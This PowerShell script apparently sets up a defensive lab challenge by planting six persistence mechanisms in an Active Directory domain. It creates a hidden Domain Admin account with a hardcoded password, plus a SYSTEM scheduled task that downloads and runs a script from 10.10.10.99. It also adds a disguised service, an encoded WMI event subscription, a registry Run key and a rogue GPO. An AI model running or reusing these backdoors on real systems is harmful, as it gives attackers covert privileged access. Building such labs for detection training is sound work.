# plant-backdoors.ps1
# Plants various persistence mechanisms for the challenge
# DO NOT READ THIS FILE BEFORE ATTEMPTING THE CHALLENGE

Write-Host "=== Setting up challenge scenario ==="

$ProgressPreference = 'SilentlyContinue'
Import-Module ActiveDirectory

Start-Sleep -Seconds 30

# --- 1. Rogue Domain Admin account ---
# Hidden with $ at the end of the name to look like a machine account
New-ADUser `
    -Name "YOURPC01$" `
    -SamAccountName "YOURPC01$" `
    -Path "CN=Computers,DC=corp,DC=local" `
    -AccountPassword (ConvertTo-SecureString "H4ck3d!2024" -AsPlainText -Force) `
    -Enabled $true `
    -ChangePasswordAtLogon $false `
    -Description ""
Add-ADGroupMember -Identity "Domain Admins" -Members "YOURPC01$"

# --- 2. Malicious Scheduled Task ---
$taskArgument = "-WindowStyle Hidden -ep bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.99/update.ps1')"""
$taskAction = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument $taskArgument
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask `
    -TaskName "Microsoft\Windows\WindowsUpdate\HealthCheck" `
    -Action $taskAction `
    -Trigger $taskTrigger `
    -Principal $taskPrincipal `
    -Description "Windows Update Health Monitoring"

# --- 3. Malicious Service ---
New-Item -Path "C:\Windows\System32\UpdateHelper.dll" -ItemType File -Force | Out-Null
Set-Content -Path "C:\Windows\System32\UpdateHelper.dll" -Value "placeholder"
sc.exe create "UpdateHelperSvc" binPath= "cmd.exe /c powershell -ep bypass -file C:\Windows\Temp\sync.ps1" start= auto DisplayName= "Windows Update Helper Service"
Set-Content -Path "C:\Windows\Temp\sync.ps1" -Value "# beacon callback placeholder"

# --- 4. WMI Event Subscription ---
$filterName = "WindowsParentalControls"
$consumerName = "ParentalControlsHandler"
$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"

$filterPath = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
    -Arguments @{
        Name           = $filterName
        EventNamespace = "root\cimv2"
        QueryLanguage  = "WQL"
        Query          = $query
    }

$consumerCommand = "powershell.exe -ep bypass -WindowStyle Hidden -c ""IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cGluZyAxMC4xMC4xMC45OQ==')))"""
$consumerPath = Set-WmiInstance -Namespace root\subscription `
    -Class CommandLineEventConsumer `
    -Arguments @{
        Name                = $consumerName
        CommandLineTemplate = $consumerCommand
    }

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
    -Arguments @{
        Filter   = $filterPath
        Consumer = $consumerPath
    }

# --- 5. Registry Run Key ---
$regValue = "powershell.exe -WindowStyle Hidden -ep bypass -file C:\ProgramData\Microsoft\defender-update.ps1"
New-ItemProperty `
    -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "WindowsDefenderUpdate" `
    -Value $regValue `
    -PropertyType String `
    -Force

New-Item -Path "C:\ProgramData\Microsoft" -ItemType Directory -Force -ErrorAction SilentlyContinue
Set-Content -Path "C:\ProgramData\Microsoft\defender-update.ps1" -Value "# callback placeholder"

# --- 6. Rogue GPO ---
$gpo = New-GPO -Name "Security Baseline Update"
$gpo | Set-GPRegistryValue `
    -Key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -ValueName "BaselineCheck" `
    -Type String `
    -Value "powershell.exe -ep bypass -file C:\Windows\Temp\baseline.ps1"
$gpo | New-GPLink -Target "DC=corp,DC=local"
Set-Content -Path "C:\Windows\Temp\baseline.ps1" -Value "# callback placeholder"

Write-Host "=== Challenge scenario ready ==="
Write-Host "Persistence mechanisms planted: 6"
